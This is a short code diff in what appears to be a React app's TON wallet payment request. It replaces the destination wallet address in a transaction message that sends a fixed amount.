@@ -122,7 +122,7 @@ export default function App() {
           validUntil: Math.floor(Date.now() / 1000) + 300,
           messages: [
             {
-              address: 'UQBWHigPTAg83wI_XW96mSHkrZDeCbKCog_Wk3mXaP0TEAfC',
+              address: 'UQDKxUUX2hNqkbaasffO33KOcCIRaUPL4SMx_X4QiQSEtout',
               amount: fixedAmountNano.toString(),
             },
           ],
